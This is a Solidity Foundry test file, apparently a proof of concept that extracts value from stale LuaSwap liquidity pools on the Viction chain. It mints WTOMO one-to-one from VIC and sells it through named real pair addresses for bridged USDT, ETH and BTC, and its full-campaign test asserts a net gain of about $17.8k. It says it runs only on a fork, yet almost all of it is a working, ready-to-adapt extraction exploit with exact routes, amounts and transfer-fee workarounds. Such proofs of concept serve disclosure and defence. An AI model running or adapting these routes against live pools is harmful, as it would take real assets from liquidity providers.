// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";

/// @title LuaSwap (Viction) stale-price extraction PoC
/// @notice Fork-only proof that a fresh, unprivileged address can mint WTOMO 1:1 with VIC
///         via deposit() and sell it into long-stale LuaSwap pools for real bridged assets
///         (USDT / ETH / BTC), netting ~$17.8k. No transactions are sent to mainnet.
interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

interface IWTOMO is IERC20 {
    function deposit() external payable;
    function withdraw(uint256) external;
}

interface IUniswapV2Pair is IERC20 {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112, uint112, uint32);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract LuaSwapC204Test is Test {
    // ---- tokens ----
    address constant WTOMO = 0xB1f66997A5760428D3a87D68b90BfE0aE64121cC;
    address constant FACTORY = 0x28c79368257CD71A122409330ad2bEBA7277a396;
    address constant USDT  = 0x381B31409e4D220919B2cFF012ED94d70135A59e;
    address constant USDC  = 0xCCA4E6302510d555B654B3EaB9c0fCB223BCFDf0;
    address constant ETH   = 0x2EAA73Bd0db20c64f53fEbeA7b5F5E5Bccc7fb8b;
    address constant BTC   = 0xAE44807D8A9CE4B30146437474Ed6fAAAFa1B809;
    address constant LUA   = 0x7262fa193e9590B2E075c3C16170f3f2f32F5C74;
    address constant TETH  = 0xA1Ff8559646a79e47ECDfaCA60272F3081998569;
    address constant TAI   = 0xB2444519F4653831b097B388D985aB3FdD5D600e;
    address constant LEC   = 0x203475f0667D9811A5b9655D85B81f17E473aB4b;
    address constant HY    = 0xA7551BA0d52C763fb6f8866DE63827aA593f20Bc;
    address constant USDE  = 0xa7eA16361Ce6a9780717813D16Dd82F4b79b257B;
    address constant MFC   = 0xd7B0224dca529721B5b871564f9c27a174ec7dAB;
    address constant CBC   = 0x6Ca97401Da035E42f4803709e94118260415b6AD;
    address constant SRM   = 0xc01643aC912B6a8ffC50CF8c1390934A6142bc91;
    address constant FTT   = 0x33fa3c0c714638f12339F85dae89c42042a2D9Af;

    // ---- pairs (verified token0/token1 by live reads in the tests) ----
    IUniswapV2Pair constant P1   = IUniswapV2Pair(0x347F551eAbA062167779C9C336Aa681526857B81); // USDT/WTOMO
    IUniswapV2Pair constant P2   = IUniswapV2Pair(0x08975663AC228c6D208fA32c968569e5939FB634); // USDT/LUA
    IUniswapV2Pair constant P3   = IUniswapV2Pair(0x75f1B142eebc21d7E118eb67CAc7f062Ab1fc761); // ETH/WTOMO
    IUniswapV2Pair constant P4   = IUniswapV2Pair(0x810a21AFE69FE356697A9824930904383930bD96); // LUA/WTOMO
    IUniswapV2Pair constant P18  = IUniswapV2Pair(0x54A12b95A207E7db77cAc8b7CdFCD5E90168187d); // ETH/LUA
    IUniswapV2Pair constant P19  = IUniswapV2Pair(0x4fBd8BA72262665DAe92f69b48e939839654771E); // BTC/WTOMO
    IUniswapV2Pair constant P32  = IUniswapV2Pair(0x48f623f8D7DB6bC05005B8D978C3fdE1B396Dea6); // WTOMO/SRM
    IUniswapV2Pair constant P68  = IUniswapV2Pair(0xad99c1Ed01944A240610d4ec048234E47600dF08); // USDT/USDC
    IUniswapV2Pair constant P76  = IUniswapV2Pair(0xc3e1d07B36829A7B530457244475B68CAF3cfd50); // WTOMO/USDC
    IUniswapV2Pair constant P142 = IUniswapV2Pair(0x8791DF121adF1ef4d4fd249Da9dfB81711C3f297); // FTT/WTOMO
    IUniswapV2Pair constant P143 = IUniswapV2Pair(0xD69651aa316a406c9FBbE1E7247E6fc70A723D86); // HY/WTOMO
    IUniswapV2Pair constant P178 = IUniswapV2Pair(0x1d48Fab0a4270AB330529C4c4dC6145aaAE90F45); // USDT/HY
    IUniswapV2Pair constant P217 = IUniswapV2Pair(0xaa8ef91386871FE288985B3f6Ad289980A9a5Dfb); // ETH/FTT
    IUniswapV2Pair constant P226 = IUniswapV2Pair(0x58C879C09d67292d8358376EF0e552eFcfADe9e0); // ETH/SRM
    IUniswapV2Pair constant P619 = IUniswapV2Pair(0x594cd690e6C22E63C690c73b90C51c1F6dc7C407); // USDT/TAI
    IUniswapV2Pair constant P620 = IUniswapV2Pair(0xd6a3c6e0A3e875ec0a38ac6A5D38D9a8FfAe8Fe8); // WTOMO/TAI
    IUniswapV2Pair constant P784 = IUniswapV2Pair(0x416a9bE895D2980536962B1dbe4caaFC5A9C0eB6); // USDT/CBC
    IUniswapV2Pair constant P785 = IUniswapV2Pair(0x19047226A99152bd46eaD19b02Ac475c6102CFB2); // CBC/WTOMO
    IUniswapV2Pair constant P809 = IUniswapV2Pair(0x8CD40a40e5eb2a0f6c2B620581915AaC69d2bE2b); // LEC/USDT
    IUniswapV2Pair constant P810 = IUniswapV2Pair(0x5B02C8a10307886B32e361bfcAf60725052C3E87); // LEC/WTOMO
    IUniswapV2Pair constant P828 = IUniswapV2Pair(0x86FE4C2542648E3549228Ae8ACe87ae8De50df4C); // USDT/USDE
    IUniswapV2Pair constant P829 = IUniswapV2Pair(0x607a0c08f38b0Dc5794aad3Fdb3D36bc04eb15F9); // USDE/WTOMO
    IUniswapV2Pair constant P890 = IUniswapV2Pair(0x2e5f7706899670a1f520908803fC801b856e2363); // USDT/tETH
    IUniswapV2Pair constant P891 = IUniswapV2Pair(0x25428B973Ad1e6dD9294255d715Df7723d2f1138); // tETH/WTOMO
    IUniswapV2Pair constant P1207 = IUniswapV2Pair(0xA0fc06EAC2415F62B6272c9f064f87e9AF87897c); // USDT/MFC
    IUniswapV2Pair constant P1208 = IUniswapV2Pair(0xEb487ce3798c51C8Ebc13128F2B23c2158653a09); // WTOMO/MFC

    // USD prices at measurement time (DefiLlama 2026-10-05): ETH $2707.786, BTC $85,513.65, stables $1
    uint256 constant PRICE_ETH_1E3 = 2707786;
    uint256 constant PRICE_BTC_1E3 = 85513650;
    uint256 constant VIC_USD_1E9 = 4475563; // $0.004475563 per VIC

    uint256 spentVic;

    receive() external payable {}

    function setUp() public {
        string memory rpc = vm.envOr("VICTION_RPC_URL", string("https://rpc.viction.xyz"));
        uint256 forkBlock = vm.envOr("FORK_BLOCK_VICTION", uint256(0));
        if (forkBlock == 0) {
            vm.createSelectFork(rpc);
        } else {
            vm.createSelectFork(rpc, forkBlock);
        }
        vm.deal(address(this), 500_000 ether);
        emit log_named_uint("fork block", block.number);
    }

    // ---------- helpers ----------
    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut)
        internal pure returns (uint256)
    {
        uint256 amountInWithFee = amountIn * 996;
        return (amountInWithFee * reserveOut) / (reserveIn * 1000 + amountInWithFee);
    }

    function _transferFee(address token, uint256 amount) internal view returns (uint256) {
        (bool ok, bytes memory data) = FACTORY.staticcall(
            abi.encodeWithSignature("getTransferFee(address,uint256)", token, amount)
        );
        if (!ok || data.length < 32) return 0;
        return abi.decode(data, (uint256));
    }

    /// sell `amountIn` of `tokenIn` into pair; returns amount received.
    function _sell(IUniswapV2Pair pair, address tokenIn, uint256 amountIn)
        internal returns (uint256 amountOut)
    {
        address t0 = pair.token0();
        (uint112 r0, uint112 r1,) = pair.getReserves();
        uint256 reserveIn;
        uint256 reserveOut;
        bool zeroForOne;
        if (tokenIn == t0) {
            reserveIn = r0; reserveOut = r1; zeroForOne = true;
        } else {
            reserveIn = r1; reserveOut = r0; zeroForOne = false;
        }
        // TRC21 transfer fees: some tokens charge the SENDER a constant minFee on transfer
        // (USDC 1000 raw, HY 2e15, USDE 1050, CBC 1e15). The pair's K check sees the
        // output+fee leave its balance, so request less; and leave the fee behind when
        // selling the entire balance.
        address tokenOut = zeroForOne ? pair.token1() : pair.token0();
        uint256 feeIn = _transferFee(tokenIn, amountIn);
        uint256 sendAmount = amountIn;
        uint256 balIn = IERC20(tokenIn).balanceOf(address(this));
        if (feeIn > 0 && sendAmount + feeIn > balIn) {
            sendAmount = balIn > feeIn + 1000 ? balIn - feeIn - 1000 : balIn / 2;
        }
        amountOut = _getAmountOut(sendAmount, reserveIn, reserveOut);
        uint256 margin = amountOut / 500 + 10 + _transferFee(tokenOut, amountOut);
        if (margin >= amountOut) margin = amountOut / 2;
        amountOut -= margin;
        IERC20(tokenIn).transfer(address(pair), sendAmount);
        if (zeroForOne) {
            pair.swap(0, amountOut, address(this), "");
        } else {
            pair.swap(amountOut, 0, address(this), "");
        }
    }

    function _deposit(uint256 vicAmount) internal {
        IWTOMO(WTOMO).deposit{value: vicAmount}();
        spentVic += vicAmount;
    }

    /// try a swap with a candidate amountOut on a snapshot; always reverts afterwards. returns success.
    function _trySwapOut(IUniswapV2Pair pair, address tokenIn, uint256 amountIn, uint256 amountOut)
        internal returns (bool)
    {
        uint256 snap = vm.snapshotState();
        (bool ok,) = tokenIn.call(abi.encodeWithSelector(IERC20.transfer.selector, address(pair), amountIn));
        if (!ok) { vm.revertToState(snap); return false; }
        if (tokenIn == pair.token0()) {
            (ok,) = address(pair).call(
                abi.encodeWithSelector(IUniswapV2Pair.swap.selector, uint256(0), amountOut, address(this), bytes(""))
            );
        } else {
            (ok,) = address(pair).call(
                abi.encodeWithSelector(IUniswapV2Pair.swap.selector, amountOut, uint256(0), address(this), bytes(""))
            );
        }
        vm.revertToState(snap);
        return ok;
    }

    function _bal(address tok) internal view returns (uint256) { return IERC20(tok).balanceOf(address(this)); }

    function _usd1e6(uint256 usdtRaw, uint256 ethWei, uint256 btcRaw) internal pure returns (uint256) {
        return usdtRaw + (ethWei * PRICE_ETH_1E3) / 1e15 + (btcRaw * PRICE_BTC_1E3) / 1e5;
    }

    // ---------- V0: mechanics ----------
    function test_wtomo_deposit_withdraw_1to1() public {
        uint256 before = _bal(WTOMO);
        _deposit(1_000 ether);
        assertEq(_bal(WTOMO) - before, 1_000 ether, "deposit must mint 1:1");
        IWTOMO(WTOMO).withdraw(1_000 ether);
        assertEq(_bal(WTOMO), before, "withdraw must burn 1:1");
    }

    function test_swap_fee_model_matches_0_4pct() public {
        _deposit(2 ether);
        (uint112 r0, uint112 r1,) = P1.getReserves(); // r0=USDT, r1=WTOMO
        uint256 predicted = _getAmountOut(1 ether, r1, r0);
        uint256 got = _sell(P1, WTOMO, 1 ether);
        emit log_named_uint("pair1 predicted out (1 WTOMO)", predicted);
        emit log_named_uint("pair1 actual out", got);
        assertLe(got, predicted, "out cannot exceed fee model");
        assertGe(got, predicted - predicted / 100, "lost more than 1% to margin");
    }

    function test_probe_actual_swap_fee() public {
        _deposit(10 ether);
        (uint112 r0, uint112 r1,) = P1.getReserves();
        uint256 dx = 1 ether;
        uint256 out997 = _getAmountOut(dx, r1, r0);
        uint256 lo = 0;
        uint256 hi = out997;
        for (uint256 i = 0; i < 48; i++) {
            uint256 mid = (lo + hi) / 2;
            if (_trySwapOut(P1, WTOMO, dx, mid)) { lo = mid; } else { hi = mid; }
        }
        uint256 outMax = lo;
        // solve pair K equation for the fee numerator f (x*1000): 
        // out = r0 - (r0*r1*1e6)/(1000*((r1+dx)*1000 - dx*f))
        uint256 denom = (uint256(r0) * uint256(r1) * 1e6) / (1000 * (uint256(r0) - outMax));
        uint256 fTimesDx = (uint256(r1) + dx) * 1000 - denom;
        uint256 f = fTimesDx / dx; // integer if fee is a clean numerator
        emit log_named_uint("out997", out997);
        emit log_named_uint("outMax", outMax);
        emit log_named_uint("implied fee numerator (out of 1000)", f);
        emit log_named_uint("fTimesDx mod dx", fTimesDx % dx);
        assertEq(f, 4, "expected 0.4% fee numerator");
    }

    function test_probe_pair76_fee() public {
        _deposit(44.9 ether * 1000);
        (uint112 r0, uint112 r1,) = P76.getReserves(); // r0 = WTOMO, r1 = USDC
        for (uint256 j = 0; j < 2; j++) {
            uint256 dx = j == 0 ? 4.49 ether : 44.9 ether;
            uint256 out996 = _getAmountOut(dx, r0, r1);
            uint256 lo = 0;
            uint256 hi = out996;
            for (uint256 i = 0; i < 48; i++) {
                uint256 mid = (lo + hi) / 2;
                if (_trySwapOut(P76, WTOMO, dx, mid)) { lo = mid; } else { hi = mid; }
            }
            emit log_named_uint("dx", dx);
            emit log_named_uint("pair76 out996", out996);
            emit log_named_uint("pair76 outMax", lo);
            emit log_named_uint("delta", out996 - lo);
        }
        // direct check: does the USDC token itself take a transfer fee?
        uint256 snap = vm.snapshotState();
        address rnd = address(0xBEEF);
        vm.prank(address(P68));
        IERC20(USDC).transfer(rnd, 1_000_000);
        emit log_named_uint("USDC sent", 1_000_000);
        emit log_named_uint("USDC received", IERC20(USDC).balanceOf(rnd));
        vm.revertToState(snap);
        assertTrue(true);
    }

    function test_recorded_reserves_still_today() public {
        // frozen state: factory scan block 114,804,371 vs live
        (uint112 r0, uint112 r1,) = P1.getReserves();
        emit log_named_uint("pair1 USDT reserve", r0);
        emit log_named_uint("pair1 WTOMO reserve", r1);
        assertApproxEqRel(uint256(r0), 4_883_128_274, 1e16, "pair1 USDT drift");
        assertApproxEqRel(uint256(r1), 876.709408977249166644e18, 1e16, "pair1 WTOMO drift");
    }

    // ---------- A: direct WTOMO -> USDT (pair1) ----------
    function test_A_pair1_direct_usdt() public {
        uint256 usdt0 = _bal(USDT);
        _deposit(30_109.90 ether);
        uint256 out = _sell(P1, WTOMO, _bal(WTOMO));
        emit log_named_decimal_uint("A USDT out", _bal(USDT) - usdt0, 6);
        assertGe(_bal(USDT) - usdt0, 4_700e6, "A: expected ~4744.5 USDT");
        assertEq(out, _bal(USDT) - usdt0, "A: balance delta mismatch");
    }

    // ---------- B: WTOMO -> LUA -> {USDT, ETH} ----------
    function test_B_lua_two_hop_usdt_and_eth() public {
        uint256 usdt0 = _bal(USDT);
        uint256 eth0 = _bal(ETH);
        _deposit(76_902.89 ether);
        _sell(P4, WTOMO, _bal(WTOMO)); // pair4: WTOMO -> LUA
        uint256 lua = _bal(LUA);
        emit log_named_decimal_uint("B LUA acquired", lua, 18);
        _sell(P2, LUA, 2_707_725.52 ether);  // LUA -> USDT
        _sell(P18, LUA, _bal(LUA));          // remaining LUA -> ETH
        emit log_named_decimal_uint("B USDT out", _bal(USDT) - usdt0, 6);
        emit log_named_decimal_uint("B ETH out", _bal(ETH) - eth0, 18);
        assertGe(_bal(USDT) - usdt0, 4_900e6, "B: expected ~4982 USDT");
        assertGe(_bal(ETH) - eth0, 2.58e18, "B: expected ~2.618 ETH");
    }

    // ---------- C: direct WTOMO -> BTC (pair19) ----------
    function test_C_btc_direct() public {
        uint256 btc0 = _bal(BTC);
        _deposit(855 ether);
        _sell(P19, WTOMO, _bal(WTOMO));
        uint256 out = _bal(BTC) - btc0;
        emit log_named_decimal_uint("C BTC out", out, 8);
        assertGe(out, 0.00775e8, "C: expected ~0.007823 BTC");
    }

    // ---------- D: WTOMO -> tETH -> USDT ----------
    function test_D_teth_usdt() public {
        uint256 usdt0 = _bal(USDT);
        _deposit(4_335 ether);
        _sell(P891, WTOMO, _bal(WTOMO));
        uint256 teth = _bal(TETH);
        emit log_named_decimal_uint("D tETH acquired", teth, 18);
        _sell(P890, TETH, teth);
        uint256 out = _bal(USDT) - usdt0;
        emit log_named_decimal_uint("D USDT out", out, 6);
        assertGe(out, 650e6, "D: expected ~677 USDT");
    }

    // ---------- E: WTOMO -> TAI -> USDT ----------
    function test_E_tai_usdt() public {
        uint256 usdt0 = _bal(USDT);
        _deposit(828.7 ether);
        _sell(P620, WTOMO, _bal(WTOMO));
        _sell(P619, TAI, _bal(TAI));
        uint256 out = _bal(USDT) - usdt0;
        emit log_named_decimal_uint("E USDT out", out, 6);
        assertGe(out, 125e6, "E: expected ~129.9 USDT");
    }

    // ---------- F: WTOMO -> LEC -> USDT ----------
    function test_F_lec_usdt() public {
        uint256 usdt0 = _bal(USDT);
        _deposit(90.68 ether);
        _sell(P810, WTOMO, _bal(WTOMO));
        _sell(P809, LEC, _bal(LEC));
        uint256 out = _bal(USDT) - usdt0;
        emit log_named_decimal_uint("F USDT out", out, 6);
        assertGe(out, 13e6, "F: expected ~14.3 USDT");
    }

    // ---------- G: small routes ----------
    function test_G_small_routes() public {
        uint256 usdt0 = _bal(USDT);
        uint256 eth0 = _bal(ETH);

        _deposit(5 ether); _sell(P3, WTOMO, _bal(WTOMO));                    // ETH direct
        uint256 u1 = _bal(USDT);
        _deposit(44.9 ether); _sell(P76, WTOMO, _bal(WTOMO)); _sell(P68, USDC, _bal(USDC));       // USDC->USDT
        emit log_named_decimal_uint("G2 pair76/68 USDT", _bal(USDT) - u1, 6);
        u1 = _bal(USDT);
        _deposit(47.8 ether); _sell(P143, WTOMO, _bal(WTOMO)); emit log_named_decimal_uint("G3 HY acquired", _bal(HY), 18); _sell(P178, HY, _bal(HY));         // HY->USDT
        emit log_named_decimal_uint("G3 pair143/178 USDT", _bal(USDT) - u1, 6);
        u1 = _bal(USDT);
        _deposit(18 ether); _sell(P829, WTOMO, _bal(WTOMO)); _sell(P828, USDE, _bal(USDE));       // USDE->USDT
        emit log_named_decimal_uint("G4 pair829/828 USDT", _bal(USDT) - u1, 6);
        u1 = _bal(USDT);
        _deposit(5.7 ether); _sell(P1208, WTOMO, _bal(WTOMO)); _sell(P1207, MFC, _bal(MFC));      // MFC->USDT
        emit log_named_decimal_uint("G5 pair1208/1207 USDT", _bal(USDT) - u1, 6);
        u1 = _bal(USDT);
        _deposit(3.3 ether); _sell(P785, WTOMO, _bal(WTOMO)); emit log_named_decimal_uint("G6 CBC acquired", _bal(CBC), 18); _sell(P784, CBC, _bal(CBC));        // CBC->USDT
        emit log_named_decimal_uint("G6 pair785/784 USDT", _bal(USDT) - u1, 6);
        _deposit(38 ether); _sell(P32, WTOMO, _bal(WTOMO)); _sell(P226, SRM, _bal(SRM));          // SRM->ETH
        _deposit(77.3 ether); _sell(P142, WTOMO, _bal(WTOMO)); _sell(P217, FTT, _bal(FTT));       // FTT->ETH

        emit log_named_decimal_uint("G USDT out", _bal(USDT) - usdt0, 6);
        emit log_named_decimal_uint("G ETH out", _bal(ETH) - eth0, 18);
        assertGt(_bal(USDT) - usdt0, 15e6, "G: expected ~18 USDT");
        assertGt(_bal(ETH) - eth0, 0.009e18, "G: expected ~0.0101 ETH");
    }

    // ---------- FULL CAMPAIGN ----------
    function test_full_campaign_net_value() public {
        uint256 usdt0 = _bal(USDT);
        uint256 eth0 = _bal(ETH);
        uint256 btc0 = _bal(BTC);
        spentVic = 0;

        // A
        _deposit(30_109.90 ether); _sell(P1, WTOMO, _bal(WTOMO));
        // B
        _deposit(76_902.89 ether); _sell(P4, WTOMO, _bal(WTOMO));
        _sell(P2, LUA, 2_707_725.52 ether);
        _sell(P18, LUA, _bal(LUA));
        // C
        _deposit(849.3 ether); _sell(P19, WTOMO, _bal(WTOMO));
        // D
        _deposit(4_335 ether); _sell(P891, WTOMO, _bal(WTOMO)); _sell(P890, TETH, _bal(TETH));
        // E
        _deposit(828.7 ether); _sell(P620, WTOMO, _bal(WTOMO)); _sell(P619, TAI, _bal(TAI));
        // F
        _deposit(90.68 ether); _sell(P810, WTOMO, _bal(WTOMO)); _sell(P809, LEC, _bal(LEC));
        // G
        _deposit(5 ether); _sell(P3, WTOMO, _bal(WTOMO));
        _deposit(44.9 ether); _sell(P76, WTOMO, _bal(WTOMO)); _sell(P68, USDC, _bal(USDC));
        _deposit(47.8 ether); _sell(P143, WTOMO, _bal(WTOMO)); _sell(P178, HY, _bal(HY));
        _deposit(18 ether); _sell(P829, WTOMO, _bal(WTOMO)); _sell(P828, USDE, _bal(USDE));
        _deposit(5.7 ether); _sell(P1208, WTOMO, _bal(WTOMO)); _sell(P1207, MFC, _bal(MFC));
        _deposit(3.3 ether); _sell(P785, WTOMO, _bal(WTOMO)); _sell(P784, CBC, _bal(CBC));
        _deposit(38 ether); _sell(P32, WTOMO, _bal(WTOMO)); _sell(P226, SRM, _bal(SRM));
        _deposit(77.3 ether); _sell(P142, WTOMO, _bal(WTOMO)); _sell(P217, FTT, _bal(FTT));

        uint256 usdtOut = _bal(USDT) - usdt0;
        uint256 ethOut = _bal(ETH) - eth0;
        uint256 btcOut = _bal(BTC) - btc0;
        uint256 gross1e6 = _usd1e6(usdtOut, ethOut, btcOut);
        uint256 vicCost1e6 = (spentVic * VIC_USD_1E9) / 1e21; // wei * $/VIC(1e9) -> 1e6 USD
        uint256 net1e6 = gross1e6 - vicCost1e6;

        emit log_named_decimal_uint("campaign VIC spent", spentVic, 18);
        emit log_named_decimal_uint("campaign USDT out", usdtOut, 6);
        emit log_named_decimal_uint("campaign ETH out", ethOut, 18);
        emit log_named_decimal_uint("campaign BTC out", btcOut, 8);
        emit log_named_uint("campaign GROSS usd*1e6", gross1e6);
        emit log_named_uint("campaign VIC cost usd*1e6", vicCost1e6);
        emit log_named_uint("campaign NET usd*1e6", net1e6);

        assertGt(gross1e6, 17_800e6, "campaign gross below $17.8k");
        assertGt(net1e6, 17_300e6, "campaign net below $17.3k");
    }
}
